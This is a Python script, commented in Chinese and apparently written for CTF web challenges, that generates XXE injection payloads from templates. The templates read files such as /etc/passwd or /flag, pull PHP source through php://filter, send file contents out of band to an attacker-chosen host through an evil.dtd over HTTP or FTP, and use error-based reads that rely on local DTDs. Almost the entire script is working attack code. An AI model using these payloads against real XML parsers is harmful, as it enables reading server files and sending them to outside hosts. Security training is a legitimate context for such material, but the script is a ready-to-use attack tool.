# -*- coding: utf-8 -*-
"""xxe_payloads.py — XXE(XML 外部实体注入)payload 生成器(Web 高频题型)

用途: 一键生成常见 XXE 注入模板, 参数化目标文件与外带主机:
      CLASSIC       经典文件读取(有回显)
      PHP_FILTER    php://filter base64 读源码(回显)
      OOB_HTTP      参数实体 + http 外带(evil.dtd 一并给出)
      OOB_FTP       ftp:// 外带(绕部分特殊字符)
      ERROR_LINUX/ERROR_WIN  报错回显(利用本地 dtd)
      支持标签间注入 <?xml 与 POST body 拼接提示。

用法:
    python xxe_payloads.py --list                        # 查看全部模板
    python xxe_payloads.py CLASSIC --file /flag          # 生成(默认 /etc/passwd)
    python xxe_payloads.py OOB_HTTP --host 1.2.3.4:8000 --file /flag
    python xxe_payloads.py PHP_FILTER --file /var/www/html/index.php
    python xxe_payloads.py --selftest                    # 内置自测
"""
import argparse
import sys

XML_PROLOG = '<?xml version="1.0" encoding="UTF-8"?>\n'

TPL = {}


def _t():
    TPL['CLASSIC'] = (
        "经典文件读取(有回显):\n" + XML_PROLOG +
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{FILE}">]>\n'
        '<user><name>&xxe;</name><pass>123</pass></user>')
    TPL['PHP_FILTER'] = (
        "php://filter base64 读源码(回显, 结果 base64 解码):\n" + XML_PROLOG +
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource={FILE}">]>\n'
        '<user><name>&xxe;</name><pass>123</pass></user>')
    TPL['OOB_HTTP'] = (
        "OOB http 外带(无回显)。先在你的 {HOST} 上放置 evil.dtd:\n"
        '  <!ENTITY % f SYSTEM "file://{FILE}">\n'
        '  <!ENTITY % send SYSTEM "http://{HOST}/?d=%f;">\n'
        '  <!ENTITY % all "<!ENTITY send SYSTEM \'http://{HOST}/?d=%f;\'>">\n'
        '  %all;\n'
        "再提交 XML:\n" + XML_PROLOG +
        '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://{HOST}/evil.dtd">%remote;]>\n'
        '<user><name>1</name><pass>&send;</pass></user>')
    TPL['OOB_FTP'] = (
        "OOB ftp 外带(内容含特殊字符时更稳, 监听 ftp 由 nc 配合):\n" + XML_PROLOG +
        '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "ftp://{HOST}/evil.dtd">%remote;]>\n'
        '<user><name>1</name><pass>&send;</pass></user>')
    TPL['ERROR_LINUX'] = (
        "报错回显读文件(Linux, 复用本地 dtd):\n" + XML_PROLOG +
        '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">\n'
        '  <!ENTITY % ISOamso "&amp;"><!ENTITY % file SYSTEM "file://{FILE}">\n'
        '  <!ENTITY % eval "<!ENTITY &#x27;&#x25;&#x73;end&#x27; SYSTEM \'file:///nonexistent/%file;\'>">\n'
        '  %eval;%remote;]>\n'
        '<user><name>1</name><pass>1</pass></user>')
    TPL['ERROR_WIN'] = (
        "报错回显读文件(Windows):\n" + XML_PROLOG +
        '<!DOCTYPE foo [<!ENTITY % remote SYSTEM "C:/Windows/system32/xsl/...位置可换msxml相关dtd">\n'
        '  <!ENTITY % file SYSTEM "file:///{FILE}">\n'
        '  <!ENTITY % eval "<!ENTITY &#x25; send SYSTEM \'file:///{FILE}\'>">\n'
        '  %eval;]>\n'
        '<user><name>1</name><pass>1</pass></user>')


def gen(name, file_path, host):
    _t()
    if name not in TPL:
        raise SystemExit('未知模板 %s, 可选: %s' % (name, ', '.join(TPL)))
    return TPL[name].replace('{FILE}', file_path).replace('{HOST}', host)


def selftest():
    ok = True
    for name in ('CLASSIC', 'PHP_FILTER', 'OOB_HTTP', 'OOB_FTP', 'ERROR_LINUX', 'ERROR_WIN'):
        out = gen(name, '/flag.txt', '1.2.3.4:80')
        ok = ok and '{FILE}' not in out and '{HOST}' not in out
        ok = ok and ('<!ENTITY' in out or '<!DOCTYPE' in out)
    print('XXE 模板参数化生成:', 'OK' if ok else 'FAIL')
    return 0 if ok else 1


def main():
    ap = argparse.ArgumentParser(description='XXE payload 生成器')
    ap.add_argument('type', nargs='?', help='模板名(CLASSIC/PHP_FILTER/OOB_HTTP/OOB_FTP/ERROR_LINUX/ERROR_WIN)')
    ap.add_argument('--file', default='/etc/passwd', help='目标文件路径')
    ap.add_argument('--host', default='127.0.0.1:8000', help='外带主机 host:port')
    ap.add_argument('--list', action='store_true', help='列出模板')
    ap.add_argument('--selftest', action='store_true', help='内置自测')
    args = ap.parse_args()
    if args.selftest:
        sys.exit(selftest())
    if args.list or not args.type:
        _t()
        for k in TPL:
            print('%-12s %s' % (k, TPL[k].splitlines()[0]))
        return
    print(gen(args.type.upper(), args.file, args.host))


if __name__ == '__main__':
    main()
